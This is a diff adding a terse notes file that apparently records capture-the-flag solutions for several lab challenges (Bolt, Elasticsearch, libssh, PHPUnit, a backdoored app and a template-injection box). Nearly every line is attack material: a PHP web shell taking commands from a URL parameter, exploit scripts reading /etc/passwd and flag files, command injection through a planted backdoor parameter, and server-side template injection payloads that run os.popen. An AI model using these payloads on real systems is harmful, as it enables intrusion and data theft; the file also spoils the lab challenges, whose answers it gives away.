@@ -1,0 +1,31 @@
+-bolt
+php echo system($_GET['cmd'])
+
+-elastic
+searchsploit elasticsearch
+python exp.py url /etc/passwd
+
+-libssh
+nmap -sv -sC -p port url -Pn
+python3 lib.py url -p port -c "cd ..;cat flag.txt"
+
+-php unit
+dirsearch url
+php system('cat /flag.txt')?>  -in burp
+
+-nodiff-backdoor
+dirsearch -u url
+wget url/backdoorfile
+grep -r "shell_exec("
+welldone=knockkcnock&shazam=cat flag.php
+
+-shark
+${7*7}
+curl -I url
+
+<%
+import os
+x=os.popen('cat flag').read()
+%>
+${x}
+
